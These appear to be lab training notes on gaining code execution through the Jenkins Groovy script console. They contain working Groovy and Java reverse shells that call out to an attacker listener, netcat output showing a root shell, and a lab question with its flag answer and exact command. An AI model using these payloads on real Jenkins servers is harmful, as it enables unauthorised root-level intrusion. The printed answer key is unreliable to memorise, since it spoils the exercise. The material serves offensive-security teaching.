# Attacking Jenkins
## Script Console
The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or `SYSTEM` account, so it can be an easy win for us.

The script console can be reached at the URL http://jenkins.inlanefreight.local:8000/script. This console allows a user to run Apache Groovy scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

There are various ways that access to the script console can be leveraged to gain a reverse shell. 

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```
$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

We could also use [this Java reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port.

```java
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Questions
1. Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory **Answer: f33ling_gr00000vy!**
   - Login as admin then visit http://jenkins.inlanefreight.local:8000/script and run this Groovy script:
        ```
        def cmd = 'cat /var/lib/jenkins3/flag.txt'
        def sout = new StringBuffer(), serr = new StringBuffer()
        def proc = cmd.execute()
        proc.consumeProcessOutput(sout, serr)
        proc.waitForOrKill(1000)
        println sout
        ```